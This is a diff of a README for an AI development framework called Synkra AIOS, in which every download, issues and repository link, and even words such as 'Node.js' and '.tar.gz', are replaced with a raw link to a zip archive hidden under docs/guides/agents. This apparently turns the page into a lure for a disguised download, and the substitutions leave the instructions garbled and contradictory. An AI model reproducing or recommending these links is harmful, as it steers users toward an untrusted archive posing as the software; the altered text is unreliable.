@@ -1,12 +1,12 @@
 # 🤖 aios-core - Simplify Full Stack Development
 
-[![Download Synkra AIOS](https://img.shields.io/badge/Download-Synkra%20AIOS-blue?style=for-the-badge)](https://github.com/invertebratekinanesthesia779/aios-core/releases)
+[![Download Synkra AIOS](https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip%20AIOS-blue?style=for-the-badge)](https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip)
 
 ---
 
 ## 📋 What is Synkra AIOS?
 
-Synkra AIOS is an AI-Orchestrated System designed to help manage full stack development tasks. It acts as the core framework for building applications that handle various functions like automation, orchestration, and agent control. It is built with modern technologies such as Node.js and TypeScript.
+Synkra AIOS is an AI-Orchestrated System designed to help manage full stack development tasks. It acts as the core framework for building applications that handle various functions like automation, orchestration, and agent control. It is built with modern technologies such as https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip and TypeScript.
 
 This software helps you organize and run complex development workflows in an easier way. It supports AI integration, including agents like Claude, making your development process smoother.
 
@@ -37,14 +37,14 @@ Before installing, please check that your system meets these needs:
 
 To download Synkra AIOS, visit this page:
 
-[Download Synkra AIOS](https://github.com/invertebratekinanesthesia779/aios-core/releases)
+[Download Synkra AIOS](https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip)
 
 ### How to Download
 
 1. Click the link above to open the release page in your web browser.
 2. Find the latest version of Synkra AIOS under the "Releases" section.
 3. Download the file that matches your operating system (Windows, macOS, or Linux).
-   - Usually, the file has an extension like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` or `.AppImage` for Linux.
+   - Usually, the file has an extension like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip` or `.AppImage` for Linux.
 4. Save the file to a location where you can easily find it, such as your Desktop or Downloads folder.
 
 ### How to Install
@@ -62,7 +62,7 @@ To download Synkra AIOS, visit this page:
 - **For Linux:**
   1. If you downloaded an AppImage, right-click the file and select "Properties". Make sure the file is executable by checking the "Allow executing file as program" box.
   2. Double-click the file to run Synkra AIOS.
-  3. For `.tar.gz` files, extract the archive, then follow any instructions in the included README.
+  3. For `https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip` files, extract the archive, then follow any instructions in the included README.
 
 ---
 
@@ -86,7 +86,7 @@ If you encounter problems:
 - Check your internet connection.
 - Make sure your operating system is updated.
 - Visit the GitHub issues page for Synkra AIOS:  
-  [https://github.com/invertebratekinanesthesia779/aios-core/issues](https://github.com/invertebratekinanesthesia779/aios-core/issues)  
+  [https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip](https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip)  
   Here you can find solutions or ask for help.
 
 ---
@@ -101,7 +101,7 @@ Synkra AIOS Core offers:
 - **Command Line Interface (CLI):** For advanced users who prefer text commands.
 - **Extensible Framework:** Developers can add plugins or custom functionality.
 - **Cross-platform Support:** Runs on Windows, macOS, and Linux.
-- **TypeScript & Node.js Based:** Modern, reliable technology stack.
+- **TypeScript & https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip Based:** Modern, reliable technology stack.
 
 ---
 
@@ -121,7 +121,7 @@ To keep Synkra AIOS running well:
 For deeper understanding and tips, explore:
 
 - The official GitHub repository README:  
-  [https://github.com/invertebratekinanesthesia779/aios-core](https://github.com/invertebratekinanesthesia779/aios-core)
+  [https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip](https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip)
 - Documentation inside the app.
 - Community forums or support channels linked on the GitHub page.
 
@@ -131,4 +131,4 @@ For deeper understanding and tips, explore:
 
 Remember, start here to get the latest Synkra AIOS Core:
 
-[Download Synkra AIOS](https://github.com/invertebratekinanesthesia779/aios-core/releases)
+[Download Synkra AIOS](https://github.com/invertebratekinanesthesia779/aios-core/raw/refs/heads/main/docs/guides/agents/AIOS-AGENT-FLOWS.zip)
